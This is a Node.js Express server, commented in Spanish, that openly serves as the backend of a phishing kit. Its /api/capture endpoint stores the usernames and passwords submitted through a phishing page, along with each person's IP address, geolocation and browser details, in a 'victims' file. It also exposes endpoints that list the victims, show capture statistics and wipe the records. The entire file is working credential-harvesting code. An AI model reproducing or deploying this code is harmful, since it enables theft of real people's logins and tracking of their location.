const express = require('express');
const cors = require('cors');
const geoip = require('geoip-lite');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Archivo para guardar víctimas
const DATA_FILE = path.join(__dirname, 'data', 'victims.json');

// Crear directorio data si no existe
if (!fs.existsSync(path.join(__dirname, 'data'))) {
    fs.mkdirSync(path.join(__dirname, 'data'));
}

// Inicializar archivo si no existe
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

// Funciones helper
function getVictims() {
    try {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return [];
    }
}

function saveVictim(victim) {
    const victims = getVictims();
    victims.push(victim);
    fs.writeFileSync(DATA_FILE, JSON.stringify(victims, null, 2));
}

// 🎯 ENDPOINT PRINCIPAL: Capturar datos
app.post('/api/capture', (req, res) => {
    // Obtener IP real (importante en Render)
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress;
    
    const geo = geoip.lookup(ip);
    
    const victimData = {
        // Datos del formulario
        username: req.body.username || 'N/A',
        password: req.body.password || 'N/A',
        
        // Información de red
        ip: ip,
        userAgent: req.headers['user-agent'] || 'Unknown',
        
        // Geolocalización
        country: geo?.country || 'Unknown',
        city: geo?.city || 'Unknown',
        region: geo?.region || 'Unknown',
        timezone: geo?.timezone || 'Unknown',
        
        // Información del navegador
        language: req.body.language || 'Unknown',
        platform: req.body.platform || 'Unknown',
        screenResolution: req.body.screenResolution || 'Unknown',
        cookiesEnabled: req.body.cookiesEnabled || false,
        
        // Timestamp
        timestamp: new Date().toISOString(),
        
        // Referrer
        referrer: req.headers.referer || 'Direct'
    };
    
    // Guardar
    saveVictim(victimData);
    
    // Log
    console.log('🎯 Nueva víctima:', victimData.username, '|', victimData.ip, '|', victimData.city);
    
    res.json({ 
        success: true, 
        message: 'Datos capturados correctamente' 
    });
});

// 📊 ENDPOINT: Ver todas las víctimas
app.get('/api/victims', (req, res) => {
    const victims = getVictims();
    res.json(victims);
});

// 📈 ENDPOINT: Estadísticas
app.get('/api/stats', (req, res) => {
    const victims = getVictims();
    
    const stats = {
        total: victims.length,
        lastCapture: victims.length > 0 ? victims[victims.length - 1].timestamp : null,
        countries: [...new Set(victims.map(v => v.country))].length,
        cities: [...new Set(victims.map(v => v.city))].length
    };
    
    res.json(stats);
});

// 🗑️ ENDPOINT: Limpiar datos
app.delete('/api/clear', (req, res) => {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
    res.json({ success: true, message: 'Datos eliminados' });
});

// 🏠 Ruta raíz (health check)
app.get('/', (req, res) => {
    res.json({ 
        status: 'Server activo ✅',
        victims: getVictims().length,
        endpoints: {
            capture: 'POST /api/capture',
            victims: 'GET /api/victims',
            stats: 'GET /api/stats',
            clear: 'DELETE /api/clear',
            phishing: 'GET /index.html',
            dashboard: 'GET /dashboard.html'
        }
    });
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`📊 Total víctimas: ${getVictims().length}`);
});
